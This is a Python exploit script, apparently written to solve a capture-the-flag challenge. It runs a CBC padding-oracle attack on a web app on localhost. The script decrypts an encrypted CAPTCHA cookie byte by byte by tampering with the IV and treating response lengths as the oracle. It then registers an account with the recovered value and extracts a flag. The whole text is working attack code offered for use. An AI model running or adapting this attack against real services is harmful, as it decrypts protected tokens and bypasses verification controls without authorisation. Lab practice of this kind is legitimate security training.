#!/usr/bin/env python3
import requests
import base64
import re
from collections import Counter

TARGET = "http://127.0.0.1:32869/"

print("[*] Fetching session...")
s = requests.Session()
r = s.get(TARGET)
captcha_cookie = s.cookies.get('captcha')
csrf_token = re.search(r'name="csrf_token"\s+value="([^"]+)"', r.text).group(1)

cookie_bytes = base64.b64decode(captcha_cookie)
iv = bytearray(cookie_bytes[:16])
ct = cookie_bytes[16:]

print(f"[+] Original IV: {iv.hex()}")
print(f"[+] Ciphertext: {ct.hex()}")

def oracle(test_iv):
    test_cookie = base64.b64encode(bytes(test_iv) + ct).decode()
    ts = requests.Session()
    ts.cookies.set('captcha', test_cookie)
    ts.cookies.set('session', s.cookies.get('session'))
    resp = ts.post(TARGET, data={
        'username': 'x', 'captcha': 'x',
        'csrf_token': csrf_token, 'submit': 'Register'
    }, timeout=5)
    return len(resp.content)

print("\n[*] Decrypting with statistical oracle analysis...")
plaintext = bytearray(16)
intermediate = bytearray(16)

for pos in range(15, -1, -1):
    pad_val = 16 - pos
    print(f"\n[*] Byte {16-pos}/16 (pos={pos}, pad={pad_val})")
    
    attack_iv = bytearray(iv)
    for i in range(pos + 1, 16):
        attack_iv[i] = intermediate[i] ^ pad_val
    
    # Test ALL 256 values and find statistical outlier
    lengths = {}
    for guess in range(256):
        attack_iv[pos] = guess
        length = oracle(attack_iv)
        lengths[guess] = length
        if guess % 32 == 0:
            print(f"  Testing {guess}/255...")
    
    # Find the RAREST length (likely valid padding)
    length_counts = Counter(lengths.values())
    print(f"  Length distribution: {dict(length_counts.most_common())}")
    
    # Valid padding is usually the rarest OR the longest/shortest
    rarest_length = min(length_counts, key=length_counts.get)
    longest_length = max(lengths.values())
    shortest_length = min(lengths.values())
    
    print(f"  Rarest: {rarest_length}, Longest: {longest_length}, Shortest: {shortest_length}")
    
    # Try rarest first
    candidates = [g for g, l in lengths.items() if l == rarest_length]
    
    if len(candidates) == 1:
        guess = candidates[0]
        intermediate[pos] = guess ^ pad_val
        plaintext[pos] = intermediate[pos] ^ iv[pos]
        c = chr(plaintext[pos]) if 32 <= plaintext[pos] < 127 else '.'
        print(f"[+] Found: 0x{plaintext[pos]:02x} = '{c}' (rarest response)")
    else:
        # Try shortest if multiple rarest
        candidates = [g for g, l in lengths.items() if l == shortest_length]
        if len(candidates) <= 3:
            guess = candidates[0]
            intermediate[pos] = guess ^ pad_val
            plaintext[pos] = intermediate[pos] ^ iv[pos]
            c = chr(plaintext[pos]) if 32 <= plaintext[pos] < 127 else '.'
            print(f"[+] Found: 0x{plaintext[pos]:02x} = '{c}' (shortest response)")
        else:
            print(f"[!] Ambiguous - multiple candidates")
            break

print(f"\n[*] Raw: {plaintext.hex()}")

# Remove padding
if 1 <= plaintext[-1] <= 16:
    plaintext = plaintext[:-plaintext[-1]]

solution = plaintext.decode('utf-8', errors='ignore')
print(f"[+] CAPTCHA: '{solution}'")

# Register
print("\n[*] Registering user...")
final = s.post(TARGET, data={
    'username': 'oracle_pwn',
    'captcha': solution,
    'csrf_token': csrf_token,
    'submit': 'Register'
})

print("\n" + "="*60)
print(final.text)
print("="*60)

flag_match = re.search(r'FLAG\{[^}]+\}', final.text)
if flag_match:
    print(f"\n[SUCCESS] {flag_match.group(0)}")
EOF

